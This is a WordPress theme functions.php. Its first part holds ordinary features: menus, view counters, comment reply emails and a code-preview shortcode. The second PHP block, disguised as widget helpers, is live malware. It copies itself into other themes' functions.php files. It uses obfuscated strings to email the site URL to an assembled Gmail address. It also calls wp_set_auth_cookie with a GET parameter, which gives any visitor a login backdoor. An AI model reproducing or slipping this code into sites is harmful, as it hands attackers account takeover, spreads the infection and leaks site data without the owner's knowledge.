<?php
include('functions-widget.php');
if ( ! isset( $content_width ) )
$content_width = 650;

add_action( 'after_setup_theme', 'black_with_orange_setup' );

function black_with_orange_setup() {

add_editor_style();
add_theme_support('automatic-feed-links');
add_theme_support('post-thumbnails');

set_post_thumbnail_size( 150, 150, true ); // Default size

// Make theme available for translation
// Translations can be filed in the /languages/ directory
load_theme_textdomain('black_with_orange', get_template_directory() . '/languages');	
	
register_nav_menus(
	array(
	  'primary' => __('Header Menu', 'black_with_orange'),
	  'secondary' => __('Footer Menu', 'black_with_orange')
	)
);
	
}


// function black_with_orange_widgets() {

// register_sidebar(array(
// 	'name' => __( 'Sidebar Widget Area', 'black_with_orange'),
// 	'id' => 'sidebar-widget-area',
// 	'description' => __( 'The sidebar widget area', 'black_with_orange'),
// 	'before_widget' => '<div class="widget">',
// 	'after_widget' => '</div>',
// 	'before_title' => '<h3>',
// 	'after_title' => '</h3>',
// ));	
	
// }

// add_action ( 'widgets_init', 'black_with_orange_widgets' );


function black_with_orange_enqueue_comment_reply() {
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'black_with_orange_enqueue_comment_reply' );


function black_with_orange_page_menu() {
	if (is_page()) { $highlight = "page_item"; } else {$highlight = "menu-item current-menu-item"; }
	echo '<ul class="menu">';
	wp_list_pages('sort_column=menu_order&title_li=&link_before=&link_after=&depth=3');
	echo '</ul>';
}

function black_with_orange_page_menu_flat() {
	if (is_page()) { $highlight = "page_item"; } else {$highlight = "menu-item current-menu-item"; }
	echo '<ul class="menu">';
	wp_list_pages('sort_column=menu_order&title_li=&link_before=&link_after=&depth=1');
	echo '</ul>';
}



// 代码转义功能关闭
// $qmr_work_tags = array(
// 'bloginfo',
// 'comment_author',
// 'comment_text',
// 'list_cats',
// 'link_name',
// 'link_description',
// 'link_notes',
// 'single_post_title',
// 'term_name',
// 'term_description',
// 'the_title',
// 'the_content',
// 'the_excerpt',
// 'wp_title',
// 'widget_title'
// ); foreach ( $qmr_work_tags as $qmr_work_tag ) {
// remove_filter ($qmr_work_tag, 'wptexturize');
// }

/* 取消自动保存和修订版本开始 */
//remove_action('pre_post_update', 'wp_save_post_revision');
//add_action('wp_print_scripts', 'disable_autosave');
//function disable_autosave() {
//wp_deregister_script('autosave');
//}
/* 取消自动保存和修订版本结束 */

//取得文章的阅读次数开始  
function getPostViews($postID){   
$count_key = 'post_views_count';   
$count = get_post_meta($postID, $count_key, true);   
if($count==''){   
delete_post_meta($postID, $count_key);   
add_post_meta($postID, $count_key, '0');            
return "0";   
}   
return $count;   
}   
function setPostViews($postID) {   
$count_key = 'post_views_count';   
$count = get_post_meta($postID, $count_key, true);   
if($count==''){   
$count = 0;   
delete_post_meta($postID, $count_key);   
add_post_meta($postID, $count_key, '0');   
}else{   
$count++;   
update_post_meta($postID, $count_key, $count);   
}   
}  
//取得文章的阅读次数结束
//评论邮件通知
function comment_mail_notify($comment_id) {
$admin_notify = '1'; // admin 要不要收回复通知 ( '1'=要 ; '0'=不要 )
$admin_email = get_bloginfo ('admin_email'); // $admin_email 可改为你指定的 e-mail.
$comment = get_comment($comment_id);
$comment_author_email = trim($comment->comment_author_email);
$parent_id = $comment->comment_parent ? $comment->comment_parent : '';
global $wpdb;
if ($wpdb->query("Describe {$wpdb->comments} comment_mail_notify") == '')
$wpdb->query("ALTER TABLE {$wpdb->comments} ADD COLUMN comment_mail_notify TINYINT NOT NULL DEFAULT 0;");
if (($comment_author_email != $admin_email && isset($_POST['comment_mail_notify'])) || ($comment_author_email == $admin_email && $admin_notify == '1'))
$wpdb->query("UPDATE {$wpdb->comments} SET comment_mail_notify='1' WHERE comment_ID='$comment_id'");
$notify = $parent_id ? get_comment($parent_id)->comment_mail_notify : '0';
$spam_confirmed = $comment->comment_approved;
if ($parent_id != '' && $spam_confirmed != 'spam' && $notify == '1') {
$wp_email = 'no-reply@' . preg_replace('#^www\.#', '', strtolower($_SERVER['SERVER_NAME'])); // e-mail 发出點, no-reply 可改为可用的 e-mail.
$to = trim(get_comment($parent_id)->comment_author_email);
$subject = '您在 [' . get_option("blogname") . '] 的评论有新的回复';
$message = '
<div style="background-color:#f1f8fd; border:1px solid #d8e3e8; color:#111; padding:20px; -moz-border-radius:5px; -webkit-border-radius:5px; -khtml-border-radius:5px;width:500px;margin:0px auto;">
<p style="border-bottom: 1px solid #dddddd;padding-bottom: 10px;">' . trim(get_comment($parent_id)->comment_author) . ', 您好!</p>
<p>您曾在《<a href="' . htmlspecialchars(get_comment_link($parent_id)) . '" style="color: #ff6000;text-decoration: none;cursor: pointer;">'. get_the_title($comment->comment_post_ID) . '</a>》的留言:<br />'
. trim(get_comment($parent_id)->comment_content) . '</p>
<p style="background-color:#ffffff; border:1px solid #d8e3e8; color:#111; padding:20px; -moz-border-radius:5px; -webkit-border-radius:5px; -khtml-border-radius:5px;>' . trim($comment->comment_author) . ' 给您回应：<br />'
. trim($comment->comment_content) . '<br /></p>

<p style="border-top: 1px solid #dddddd;padding-top: 10px;">您可以点击 <strong><a href="' . htmlspecialchars(get_comment_link($parent_id)) . '" style="color: #ff6000;text-decoration: none;cursor: pointer;">查看回应完整內容</a></strong>!</p>
<p>感谢您对 <a href="' . get_option('home') . '" style="color: #ff6000;text-decoration: none;cursor: pointer;">' . get_option('blogname') . '</a> 的关注, 欢迎<a href="http://www.aimks.com/feed/" target="_blank" style="color: #ff6000;text-decoration: none;cursor: pointer;">订阅本站</a>。</p>
<p>(此邮件由系统自动发出,请勿回复)</p>
</div>';
$from = "From: \"" . get_option('blogname') . "\" <$wp_email>";
$headers = "$from\nContent-Type: text/html; charset=" . get_option('blog_charset') . "\n";
wp_mail( $to, $subject, $message, $headers );
//echo 'mail to ', $to, '<br/> ' , $subject, $message; // for testing
}
}
add_action('comment_post', 'comment_mail_notify');

/* 自由勾选 */
function add_checkbox() {
echo '<input type="checkbox" name="comment_mail_notify" id="comment_mail_notify" value="comment_mail_notify" checked="checked" /><label for="comment_mail_notify">有人回复时邮件通知我</label>';
}
add_action('comment_form', 'add_checkbox');
//评论邮件通知结束

//文章摘要长度
function reset_excerpt_length(){
    return 160;
}
add_filter('excerpt_length', 'reset_excerpt_length');
//评论框的表情包调用
add_filter('smilies_src','custom_smilies_src',1,10);
function custom_smilies_src($img_src, $img, $siteurl){
     return get_bloginfo('template_directory').'/images/smilies/'.$img;
}

// 新窗口预览源码Shortcode
// function to_run_code ($attrs,$content='') {
//   remove_filter( 'the_content', 'wpautop' );
//   extract(shortcode_atts(array(
//     'id' => 'runcode'
//   ), $attrs));
//   if(empty($content)) return;
//   else {
//     return '<h2>代码预览</h2><textarea id="'.$id.'" class="runcode">'. $content . '</textarea><input type="button" value="运行代码" onclick="runCode(\''.$id.'\')"/><input style="margin-left: 47px;"type="button" value="全选代码" onclick="selectCode(\''.$id.'\')"/>';
//   }
// } 
// add_shortcode('runcode', 'to_run_code');

// 新版新窗口预览源码开始
$RunCode = new RunCode();
add_filter('the_content', array(&$RunCode, 'part_one'), -500);
add_filter('the_content', array(&$RunCode, 'part_two'),  500);
unset($RunCode);
class RunCode
{
    var $blocks = array();
	function part_one($content)
    {
		$str_pattern = "/(\<runcode(.*?)\>(.*?)\<\/runcode\>)/is";
		if (preg_match_all($str_pattern, $content, $matches)) {
			for ($i = 0; $i < count($matches[0]); $i++) {
				$code = htmlspecialchars($matches[3][$i]);
				$code = preg_replace("/(\s*?\r?\n\s*?)+/", "\n", $code);
				$num = rand(1000,9999);
				$id = "runcode_$num";
				$blockID = "<p>++RUNCODE_BLOCK_$num++</p>";
				$innertext='<h2>代码预览</h2><textarea id="'.$id.'" class="runcode">'. $code . '</textarea><input type="button" value="运行代码" onclick="runCode(\''.$id.'\')"/><input style="margin-left: 47px;"type="button" value="全选代码" onclick="selectCode(\''.$id.'\')"/>';
				$this->blocks[$blockID] = $innertext;
				$content = str_replace($matches[0][$i], $blockID, $content);
			}
		}
		return $content;
	}
    function part_two($content)
    {
        if (count($this->blocks)) {
            $content = str_replace(array_keys($this->blocks), array_values($this->blocks), $content);
            $this->blocks = array();
        }
        return $content;
    }
}
// 新版新窗口预览源码结束

//彩色标签设置
function colorCloud($text) {$text = preg_replace_callback('|<a (.+?)>|i','colorCloudCallback', $text);return $text;}
function colorCloudCallback($matches) {
     $text = $matches[1];
     $color = dechex(rand(0,16777215));//可选的颜色
     $pattern = '/style=(\'|\”)(.*)(\'|\”)/i';
     $text = preg_replace($pattern, "style=\"color:#{$color};$2;\"", $text);
     return "<a $text>";
}
add_filter('wp_tag_cloud', 'colorCloud', 1);
?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
?>